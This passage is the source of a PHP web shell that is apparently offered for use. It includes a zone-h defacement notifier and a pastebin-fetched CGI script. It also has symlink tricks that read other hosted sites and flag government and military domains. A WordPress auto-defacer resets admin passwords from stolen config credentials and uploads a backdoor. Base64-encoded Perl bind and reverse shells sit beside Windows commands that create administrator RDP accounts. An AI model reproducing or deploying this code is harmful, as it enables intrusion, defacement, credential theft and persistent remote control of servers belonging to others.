echo "<br>";
}
}	
} elseif($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Jonathan Miles'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('idx_cgi', 0755);
	$file_cgi = "idx_cgi/cgi.izo";
	$isi_htcgi = "AddHandler cgi-script .izo";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, $cgi_script);
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
	echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['do'] == 'fake_root') {
	ob_start();
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = getsource("$url/~$user/$file");
			if(preg_match("/hacked/i", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
		User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
		Domain: <br>
		<textarea style='width: 450px; height: 250px;' name='url'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
	}
} elseif($_GET['do'] == 'symlink') {

@set_time_limit(0);

echo "<br><br><center><h1>+--=[ Symlink ]=--+</h1></center><br><br><center><div class=content>";

@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
$malay	= '\.my';
$china	= '\.cn';
$japan	= '\.jp';
$austr	= '\.au';
$porn	= '\.xxx';
$as		= '\.uk';
$calfn	= '\.ca';

if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
flush();
}
}
}
}

echo "</center></table>";   

}	
 elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
} elseif($_GET['do'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$scan = $_POST['link_config'];
		$link_config = scandir($scan);
		$script = htmlspecialchars($_POST['script']);
		$user = "global";
		$pass = "global";
		$passx = md5($pass);
		foreach($link_config as $dir_config) {
			if(!is_file("$scan/$dir_config")) continue;
			$config = file_get_contents("$scan/$dir_config");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."users";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				if($target == '') {					
					echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
				} else {
					echo "[+] $target <br>";
				}
				$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
				if(!$conn OR !$db OR !$update) {
					echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
					mysql_close($conn);
				} else {
					$site = "$target/wp-login.php";
					$site2 = "$target/wp-admin/theme-install.php?upload";
					$b1 = anucurl($site2);
					$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
					$b = lohgin($site, $site2, $user, $pass, $wp_sub);
					$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
					$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
					$www = "m.php";
					$fp5 = fopen($www,"w");
					fputs($fp5,$upload3);
					$post2 = array(
							"_wpnonce" => "$anu2",
							"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
							"themezip" => "@$www",
							"install-theme-submit" => "Install Now",
							);
					$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
						  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
						  curl_setopt($ch, CURLOPT_POST, 1);
						  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
						  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
						  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
					      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
					$data3 = curl_exec($ch);
						  curl_close($ch);
					$y = date("Y");
					$m = date("m");
					$namafile = "id.php";
					$fpi = fopen($namafile,"w");
					fputs($fpi,$script);
					$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
						   curl_setopt($ch6, CURLOPT_POST, true);
						   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
						   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
						   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  		   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  		   curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
					$postResult = curl_exec($ch6);
						   curl_close($ch6);
					$as = "$target/k.php";
					$bs = anucurl($as);
					if(preg_match("#$script#is", $bs)) {
            	       	echo "[+] <font color='lime'>berhasil mepes...</font><br>";
            	       	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
            	        } else {
            	        echo "[-] <font color='red'>gagal mepes...</font><br>";
            	        echo "[!!] coba aja manual: <br>";
            	        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
            	        echo "[+] username: <font color=lime>$user</font><br>";
            	        echo "[+] password: <font color=lime>$pass</font><br><br>";     
            	        }
            		mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface</h1>
		<form method='post'>
		<input type='text' name='link_config' size='50' height='10' value='$dir'><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by Garuda Security Hacker' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form>
		<br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
		</center>";
	}
} elseif($_GET['do'] == 'network') {
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
	<input type='submit' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	<br>PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
	<input type='submit' name='sub_bc' value='>>'>
	</form>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
} elseif($_GET['do'] == 'krdp_shell') {
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			$user = htmlspecialchars($_POST['user']);
			$pass = htmlspecialchars($_POST['pass']);
			if(preg_match("/$user/", exe("net user"))) {
				echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
			} else {
				$add_user   = exe("net user $user $pass /add");
    			$add_groups1 = exe("net localgroup Administrators $user /add");
    			$add_groups2 = exe("net localgroup Administrator $user /add");
    			$add_groups3 = exe("net localgroup Administrateur $user /add");
    			echo "[ RDP ACCOUNT INFO ]<br>
    			------------------------------<br>
    			IP: <font color=lime>".$ip."</font><br>
    			Username: <font color=lime>$user</font><br>
    			Password: <font color=lime>$pass</font><br>
    			------------------------------<br><br>
    			[ STATUS ]<br>
    			------------------------------<br>
    			";
    			if($add_user) {
    				echo "[add user] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add user] -> <font color='red'>Gagal</font><br>";
    			}
    			if($add_groups1) {
        			echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups2) {
        		    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups3) { 
        		    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
    			}
    			echo "------------------------------<br>";
			}
		} elseif($_POST['s_opsi']) {
			$user = htmlspecialchars($_POST['r_user']);
			if($_POST['opsi'] == '1') {
				$cek = exe("net user $user");
				echo "Checking username <font color=lime>$user</font> ....... ";
				if(preg_match("/$user/", $cek)) {
					echo "[ <font color=lime>Sudah ada</font> ]<br>
					------------------------------<br><br>
					<pre>$cek</pre>";
				} else {
					echo "[ <font color=red>belum ada</font> ]";
				}
			} elseif($_POST['opsi'] == '2') {
				$cek = exe("net user $user global");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>global</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} elseif($_POST['opsi'] == '3') {
				$cek = exe("net user $user /DELETE");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[remove user: <font color=lime>$user</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} else {
				//
			}
		} else {
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='global' required>
			<input type='text' name='pass' placeholder='password' value='global' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
			<input type='text' name='r_user' placeholder='username' required>
			<select name='opsi'>
			<option value='1'>Cek Username</option>
			<option value='2'>Ubah Password</option>
			<option value='3'>Hapus Username</option>
			</select>
			<input type='submit' name='s_opsi' value='>>'>
			</form>
			";
		}
	} else {
		echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
	}
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	if(is_dir($dir)) {
		if(is_writable($dir)) {
			@rmdir($dir);
			@exe("rm -rf $dir");
			@exe("rmdir /s /q $dir");
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>could not remove ".basename($dir)."</font>";
		}
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr>
			<th class="th_home"><center>Name</center></th>
			<th class="th_home"><center>Type</center></th>
			<th class="th_home"><center>Size</center></th>
			<th class="th_home"><center>Last Modified</center></th>
			<th class="th_home"><center>Owner/Group</center></th>
			<th class="th_home"><center>Permission</center></th>
			<th class="th_home"><center>Action</center></th>
			</tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?dir=$dir'>$dirx</a>";
 				} else {
 					$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 				}
 				echo "<tr>";
 				echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
				echo "<td class='td_home'><center>$dtype</center></td>";
				echo "<td class='td_home'><center>-</center></th></td>";
				echo "<td class='td_home'><center>$dtime</center></td>";
				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
